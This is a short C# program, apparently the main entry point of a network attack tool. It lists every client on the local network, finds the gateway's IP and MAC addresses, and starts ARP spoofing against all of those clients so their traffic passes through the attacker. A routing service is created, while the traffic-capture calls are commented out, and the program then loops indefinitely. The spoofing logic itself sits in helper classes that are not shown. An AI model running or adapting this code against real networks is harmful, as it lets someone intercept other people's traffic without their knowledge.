
using sandbox;
using sandbox.Helpers;
using sandbox.Service;

LanClientsList.CaptureLanClients();

var gatewayIp = GatewayHelpers.GetGatewayIP();
var gatewayMac = GatewayHelpers.GetGatewayMAC(LanClientsList.GetLanClientsList());
var targetlist = LanClientsList.GetLanClientsList();
SpoofingService.StartSpoof(targetlist, gatewayIp, gatewayMac);
// Constants.captureDevice.Open();
RoutingService routingService = new RoutingService(LanClientsList.GetLanClientsList());
//routingService.StartCapture();
while(1==1)
{
  //wait
}